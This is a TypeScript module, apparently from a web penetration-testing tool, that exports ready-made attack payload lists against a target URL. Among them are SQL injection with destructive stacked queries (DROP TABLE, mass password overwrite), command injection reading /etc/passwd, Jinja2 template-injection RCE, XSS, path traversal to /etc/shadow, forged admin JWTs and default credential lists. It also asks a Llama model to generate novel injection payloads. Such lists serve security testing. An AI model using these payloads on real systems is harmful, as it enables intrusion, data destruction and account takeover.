/**
 * Payload Generator — deterministic attack payloads + optional AI augmentation.
 *
 * AI (Groq/Llama) is used ONLY to generate additional context-specific payloads.
 * All core payload lists are deterministic and do not require any API key.
 *
 * Usage:
 *   const payloads = await generatePayloads("login", "https://target.com/api/login");
 */

export type AttackContext = "login" | "register" | "search" | "api" | "general";

export interface AuthBypassPayload {
  description: string;
  headers: Record<string, string>;
  body?: Record<string, unknown>;
}

export interface ParameterPayload {
  description: string;
  queryParams?: Record<string, string>;
  bodyFields?: Record<string, unknown>;
}

export interface PayloadSet {
  sqlInjection: string[];
  commandInjection: string[];
  scriptInjection: string[];
  pathTraversal: string[];
  authBypass: AuthBypassPayload[];
  parameterManipulation: ParameterPayload[];
  fuzzing: string[];
  loginCredentials: Array<{ email: string; password: string }>;
}

// ── SQL Injection ─────────────────────────────────────────────────────────────
export const SQL_PAYLOADS: string[] = [
  // Classic OR-based login bypass
  "' OR '1'='1",
  "' OR '1'='1'--",
  "' OR '1'='1'/*",
  '" OR "1"="1',
  "admin'--",
  "admin' #",
  "') OR ('1'='1",
  "' OR 1=1 LIMIT 1--",
  "admin'/*",
  // Error-based (leak DB version/data via error messages)
  "' AND 1=CONVERT(int,'test')--",
  "' AND extractvalue(1,concat(0x7e,version()))--",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  "' OR EXISTS(SELECT * FROM users WHERE email='admin@admin.com')--",
  // Time-based blind (detect via latency > 4s)
  "' AND SLEEP(5)--",
  "'; WAITFOR DELAY '0:0:5'--",
  "' OR BENCHMARK(10000000,SHA1('a'))--",
  "1; SELECT pg_sleep(5)--",
  // Boolean-based blind (compare TRUE vs FALSE response)
  "' AND '1'='1",
  "' AND '1'='2",
  "' AND 1=1--",
  "' AND 1=2--",
  "' OR 1=1#",
  "' OR 1=2#",
  // UNION-based (extract data into response)
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT 1,user(),3--",
  "' UNION SELECT 1,database(),3--",
  "' UNION SELECT 1,@@version,3--",
  "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
  // Stacked queries
  "'; DROP TABLE sessions;--",
  "'; INSERT INTO users(email,password) VALUES('attacker@evil.com','hacked')--",
  "'; UPDATE users SET password='hacked' WHERE '1'='1'--",
];

// ── Command Injection ─────────────────────────────────────────────────────────
export const CMD_PAYLOADS: string[] = [
  // Unix shell operators
  "; ls -la",
  "| ls -la",
  "|| ls -la",
  "&& ls -la",
  "& ls -la",
  "`ls -la`",
  "$(ls -la)",
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "$(cat /etc/passwd)",
  "`cat /etc/passwd`",
  "; id",
  "| id",
  "$(id)",
  "; whoami",
  "| whoami",
  "; ping -c 1 127.0.0.1",
  // Encoding-based bypass
  "\n/bin/sh -c id",
  "\r\nid",
  "%0a%20id",
  "%3b%20ls",
  // Windows
  "& dir",
  "| dir",
  "&& dir",
  "& type C:\\Windows\\win.ini",
];

// ── Script / Template Injection ───────────────────────────────────────────────
export const SCRIPT_PAYLOADS: string[] = [
  // Server-Side Template Injection (SSTI) — evaluates to 49 if vulnerable
  "{{7*7}}",
  "{{7*'7'}}",            // Twig → "7777777"
  "${7*7}",
  "<%= 7 * 7 %>",         // ERB Ruby
  "#{7*7}",               // Ruby / Slim
  "@(7*7)",               // Razor
  // Jinja2 RCE payloads
  "{{config}}",
  "{{request.environ}}",
  "{{''.__class__.__mro__[2].__subclasses__()}}",
  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
  // XSS reflected
  "<script>alert(document.domain)</script>",
  "<img src=x onerror=alert(1)>",
  "\"><svg onload=alert(1)>",
  "javascript:alert(1)",
  // LDAP injection
  "*)(uid=*))(|(uid=*",
  "*()|%26'",
  "*()(uid=*))(|(uid=*",
];

// ── Path Traversal ────────────────────────────────────────────────────────────
export const PATH_PAYLOADS: string[] = [
  "../../../etc/passwd",
  "....//....//....//etc/passwd",
  "..%2F..%2F..%2Fetc/passwd",
  "..%252F..%252F..%252Fetc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..\\..\\..\\windows\\win.ini",
  "/etc/passwd",
  "/etc/shadow",
  "/proc/self/environ",
  "/proc/self/cmdline",
  "/var/log/apache2/access.log",
  "C:\\Windows\\win.ini",
  "file:///etc/passwd",
];

// ── Auth Bypass ───────────────────────────────────────────────────────────────
export const AUTH_PAYLOADS: AuthBypassPayload[] = [
  { description: "No auth header", headers: {} },
  { description: "Empty Bearer token", headers: { Authorization: "Bearer " } },
  { description: "Malformed JWT", headers: { Authorization: "Bearer invalid.token.here" } },
  {
    description: "JWT none algorithm",
    headers: {
      Authorization:
        "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
    },
  },
  {
    description: "JWT expired",
    headers: {
      Authorization:
        "Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjF9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    },
  },
  {
    description: "JWT admin role claim",
    headers: {
      Authorization:
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    },
  },
  { description: "Basic auth admin:admin", headers: { Authorization: "Basic YWRtaW46YWRtaW4=" } },
  { description: "Basic auth admin:password", headers: { Authorization: "Basic YWRtaW46cGFzc3dvcmQ=" } },
  {
    description: "X-Admin header override",
    headers: { "X-Admin": "true", "X-Is-Admin": "1", "X-User-Role": "admin", "X-Forwarded-User": "admin" },
  },
  {
    description: "Mass-assign admin in body",
    headers: { "Content-Type": "application/json" },
    body: { role: "admin", isAdmin: true, admin: 1, is_admin: true, userType: "superadmin" },
  },
];

// ── Parameter Manipulation ────────────────────────────────────────────────────
export const PARAM_PAYLOADS: ParameterPayload[] = [
  { description: "Privilege escalation via query", queryParams: { role: "admin", isAdmin: "true", admin: "1" } },
  { description: "Privilege via body", bodyFields: { role: "admin", isAdmin: true, admin: 1, userType: "administrator" } },
  { description: "Prototype pollution", bodyFields: { __proto__: { isAdmin: true }, constructor: { prototype: { isAdmin: true } } } },
  { description: "HTTP parameter pollution", queryParams: { id: "1" } },
  { description: "Negative ID", queryParams: { id: "-1", userId: "-1" } },
  { description: "Zero ID", queryParams: { id: "0", userId: "0" } },
  { description: "Max integer overflow", queryParams: { id: "99999999999999999" } },
  { description: "Debug mode unlock", queryParams: { debug: "true", _debug: "1", test: "true" } },
  { description: "Type confusion: array email", bodyFields: { email: ["admin@admin.com"], password: ["pass"] } },
  { description: "Type confusion: object email", bodyFields: { email: { "$gt": "" } } },
  { description: "Null byte in query", queryParams: { id: "1\x00", email: "legit@b.com\x00.evil.com" } },
];

// ── Default Credentials ───────────────────────────────────────────────────────
const DEFAULT_CREDENTIALS = [
  { email: "admin@admin.com", password: "admin" },
  { email: "admin@admin.com", password: "admin123" },
  { email: "admin@admin.com", password: "password" },
  { email: "admin@admin.com", password: "password123" },
  { email: "admin@example.com", password: "admin" },
  { email: "test@test.com", password: "test" },
  { email: "user@user.com", password: "user" },
  { email: "root@localhost", password: "root" },
  { email: "admin", password: "admin" },
];

// ── Fuzzing ───────────────────────────────────────────────────────────────────
export const FUZZ_PAYLOADS: string[] = [
  "",
  "null",
  "undefined",
  "true",
  "false",
  "0",
  "-1",
  "NaN",
  "Infinity",
  "[]",
  "{}",
  "[null]",
  // Prototype pollution via string
  '{"__proto__":{"isAdmin":true}}',
  '{"constructor":{"prototype":{"isAdmin":true}}}',
  // Large payload (DoS probe)
  "A".repeat(10_000),
  // Null bytes
  "\x00\x00\x00",
  "%00",
  // CRLF
  "\r\n\r\n",
  "%0d%0a",
  // Unicode
  "😀🔒💀🎯",
  "日本語テスト",
  "Ñoño",
  "\u202e",      // Right-to-left override
  // Template-looking strings (SSTI probe)
  "{{7*7}}",
  "${7*7}",
  "<%= 7*7 %>",
  // Path traversal
  "../../../etc/passwd",
  // Command injection
  "; ls",
  "$(id)",
];

/**
 * Use Groq to generate additional context-specific payloads.
 * Returns an empty array if GROQ_API_KEY is not set.
 */
async function generateAiPayloads(context: AttackContext, targetUrl: string): Promise<string[]> {
  const apiKey = process.env.GROQ_API_KEY;
  if (!apiKey) return [];

  const prompt = `You are a penetration tester. Target: ${targetUrl} (${context} endpoint).
Generate 5 novel ${context === "login" || context === "register" ? "SQL injection" : "input injection"} test payloads NOT in common lists.
Return ONLY a JSON array of strings. No explanation. Example: ["payload1","payload2"]`;

  try {
    const { default: Groq } = await import("groq-sdk");
    const groq = new Groq({ apiKey });
    const completion = await groq.chat.completions.create({
      model: "llama-3.1-8b-instant",
      messages: [{ role: "user", content: prompt }],
      max_tokens: 300,
      temperature: 0.5,
    });
    const raw = completion.choices[0]?.message?.content ?? "";
    const match = raw.match(/\[[\s\S]*\]/);
    if (match) return JSON.parse(match[0]) as string[];
  } catch { /* fallback silently */ }
  return [];
}

/**
 * Build a complete payload set for the given attack context.
 * Pass useAi=true to augment with AI-generated payloads (requires GROQ_API_KEY).
 */
export async function generatePayloads(
  context: AttackContext,
  targetUrl: string = "",
  useAi: boolean = false
): Promise<PayloadSet> {
  const aiExtra = useAi ? await generateAiPayloads(context, targetUrl) : [];
  return {
    sqlInjection: [...SQL_PAYLOADS, ...aiExtra],
    commandInjection: CMD_PAYLOADS,
    scriptInjection: SCRIPT_PAYLOADS,
    pathTraversal: PATH_PAYLOADS,
    authBypass: AUTH_PAYLOADS,
    parameterManipulation: PARAM_PAYLOADS,
    fuzzing: FUZZ_PAYLOADS,
    loginCredentials: DEFAULT_CREDENTIALS,
  };
}
